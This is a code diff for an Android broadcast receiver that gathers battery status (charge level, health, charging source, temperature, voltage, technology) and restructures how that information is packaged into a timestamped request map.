@@ -7,9 +7,14 @@ import android.content.res.Resources;
 import android.os.BatteryManager;
 import android.util.Log;
 
+import java.util.HashMap;
+import java.util.Map;
+
 import com.inet.android.certificate.R;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.AppSettings;
+import com.inet.android.utils.ConvertDate;
 
 public class InfoBatteryReceiver extends BroadcastReceiver {
 	private String TAG = InfoBatteryReceiver.class.getSimpleName().toString();
@@ -26,13 +31,20 @@ public class InfoBatteryReceiver extends BroadcastReceiver {
 		// TODO Auto-generated method stub
 		if (AppSettings.getState(0, context) == 0)
 			return;
-		
+
 		path = context.getApplicationContext().getResources();
-		String area = path.getString(R.string.battery);
+
 		if (intent.getAction().equals(Intent.ACTION_BATTERY_CHANGED)) {
-			RequestList.sendDataRequest(area,
-					getInfoBattery(context.getApplicationContext(), intent),
-					context);
+			Map<String, Object> device = new HashMap<String, Object>();
+			Map<String, String> info = new HashMap<String, String>();
+			device.put("type", AppConstants.TYPE_SERVICE_REQUEST);
+			device.put("time", ConvertDate.logTime());
+			info.put("area", path.getString(R.string.battery));
+			info.put("event", getInfoBattery(context.getApplicationContext(), intent));
+			device.put("info", info);
+
+			RequestList.sendDataRequest(device, null, context);
+
 			context.getApplicationContext().unregisterReceiver(this);
 		}
 	}
@@ -45,8 +57,7 @@ public class InfoBatteryReceiver extends BroadcastReceiver {
 		if (status > -1 && scale > -1 && level > -1 && scale != 0) {
 			float batteryPct = level / (float) scale;
 			Log.d(TAG, path.getString(R.string.charge_level) + batteryPct);
-			infoBattery = this.connect_dev + "\n"
-					+ path.getString(R.string.charge_level) + " "
+			infoBattery = this.connect_dev + "\n" + path.getString(R.string.charge_level) + " "
 					+ Float.toString(batteryPct * 100) + " %" + "\n";
 		}
 		String strStatus;
@@ -62,11 +73,9 @@ public class InfoBatteryReceiver extends BroadcastReceiver {
 			strStatus = "";
 		}
 		if (!strStatus.equals(""))
-			infoBattery += path.getString(R.string.status_battery) + " "
-					+ strStatus + "\n";
+			infoBattery += path.getString(R.string.status_battery) + " " + strStatus + "\n";
 
-		int health = intent.getIntExtra(BatteryManager.EXTRA_HEALTH,
-				BatteryManager.BATTERY_HEALTH_UNKNOWN);
+		int health = intent.getIntExtra(BatteryManager.EXTRA_HEALTH, BatteryManager.BATTERY_HEALTH_UNKNOWN);
 		String strHealth;
 		if (health == BatteryManager.BATTERY_HEALTH_GOOD) {
 			strHealth = path.getString(R.string.battery_healt_good);
@@ -77,14 +86,12 @@ public class InfoBatteryReceiver extends BroadcastReceiver {
 		} else if (health == BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE) {
 			strHealth = path.getString(R.string.battery_healt_over_voltage);
 		} else if (health == BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE) {
-			strHealth = path
-					.getString(R.string.battery_healt_unspecified_failure);
+			strHealth = path.getString(R.string.battery_healt_unspecified_failure);
 		} else {
 			strHealth = "";
 		}
 		if (!strHealth.equals(""))
-			infoBattery += path.getString(R.string.status_battery_healt) + " "
-					+ strHealth + "\n";
+			infoBattery += path.getString(R.string.status_battery_healt) + " " + strHealth + "\n";
 		// Каким образом проходит зарядка?
 		int chargePlug = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
 		String charge = "";
@@ -98,16 +105,13 @@ public class InfoBatteryReceiver extends BroadcastReceiver {
 			charge = "";
 		}
 		if (!charge.equals(""))
-			infoBattery += path.getString(R.string.status_battery_charge) + " "
-					+ charge + "\n";
+			infoBattery += path.getString(R.string.status_battery_charge) + " " + charge + "\n";
 
 		// Температура батареи
-		int temperature = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE,
-				-1) / 10;
+		int temperature = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1) / 10;
 
 		if (temperature != -1)
-			infoBattery += path.getString(R.string.status_battery_temperature) + " "
-					+ temperature + "° \n";
+			infoBattery += path.getString(R.string.status_battery_temperature) + " " + temperature + "° \n";
 
 		// Вольтаж батареи
 		int voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1) / 1000;
@@ -115,12 +119,10 @@ public class InfoBatteryReceiver extends BroadcastReceiver {
 		if (voltage != -1)
 			infoBattery += path.getString(R.string.status_voltage) + " " + voltage + "V \n";
 		// Наличие батареи
-		String technology = intent
-				.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY);
+		String technology = intent.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY);
 
 		if (technology != null)
-			infoBattery += path.getString(R.string.battery_technology)
-					+ " " + technology + "\n";
+			infoBattery += path.getString(R.string.battery_technology) + " " + technology + "\n";
 		return infoBattery;
 	}
 }
